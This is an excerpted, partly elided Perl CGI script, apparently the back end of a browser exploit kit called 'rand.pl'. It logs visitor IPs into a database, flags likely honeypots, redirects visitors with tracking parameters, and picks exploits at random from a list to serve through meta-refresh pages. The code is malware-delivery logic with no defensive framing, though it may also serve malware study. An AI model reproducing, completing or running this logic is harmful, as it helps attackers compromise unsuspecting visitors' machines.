...
if($verifdoubleipch eq "")
{
  ...
  $sql = "INSERT hosts (ip, browser, browser_version, os, os_flavor, service_pack, os_lang, country, arch, referer, aff) VALUES ('$ip_number', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', '$country', 'HoneyPot', 'rand.pl', 'HoneyPot')";
...
if($run eq '0')
{
  ...
  $urlrefresh = 'rand.pl?run=1&timecheck=' . $timebeforechk . '&csname=' . $csname . '&ip=' . $ip_number . '&chkchkxpl=' . $chkchkxpl . '&aff=' . $aff . '&xplld=' . $exploitstringtoload . '&flavor=' . $flavor;
  print "Status: 301 Moved\nLocation: $urlrefresh\n\n";
}
...
if($run eq "1")
{
  ...
  if($xploitserve[$incxl] eq "" or $run eq "no")
  {
  ...
  {
    while($xploitserve[$incxl] ne "")
    {
      $incxl++;
    }
    $randomxl = int(rand($incxl));
    $exploitnow = $xploitserve[$randomxl];
    ...
    print '<html>' . "\n";
    print '<head>' . "\n";
    print '<meta http-equiv="Refresh" content="' . $timebeforechk2 . '; url=rand.pl?run=1&timecheck=' . $timebeforechk . '&csname=' . $csname . '&ip=' . $ip_number . '&chkchkxpl=' . $chkchkxpl . '&aff=' . $aff . '&xplld=' . $exploitstringtoload . '&flavor=' . $flavor . '" />';
    print '</head>' . "\n";
    print '<body>' . "\n";
...
sub xplvalidornot
{
  ...
  if($a1chk =~ 'on')
  {
    $exploitstringtoload .= $runmexplty . ':';
  }
}
